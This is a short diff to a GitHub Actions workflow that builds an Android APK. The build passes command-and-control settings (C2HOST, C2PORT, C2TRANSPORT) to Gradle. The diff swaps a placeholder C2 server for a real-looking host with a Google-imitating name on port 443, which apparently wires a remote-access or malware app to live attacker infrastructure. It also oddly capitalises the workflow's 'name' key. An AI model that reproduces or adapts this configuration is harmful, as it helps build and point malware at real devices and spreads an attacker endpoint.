@@ -1,4 +1,4 @@
-name: Build Android APK
+Name: Build Android APK
 
 on:
   push:
@@ -26,7 +26,7 @@ jobs:
         gradle-version: '8.7'
 
     - name: Build Debug APK
-      run: gradle assembleDebug -PC2HOST="your-c2-server.com" -PC2PORT=8443 -PC2TRANSPORT="HTTPS"
+      run: gradle assembleDebug -PC2HOST="google-alkly.onrender.com" -PC2PORT=443 -PC2TRANSPORT="HTTPS"
 
     - name: Upload APK Artifact
       uses: actions/upload-artifact@v4
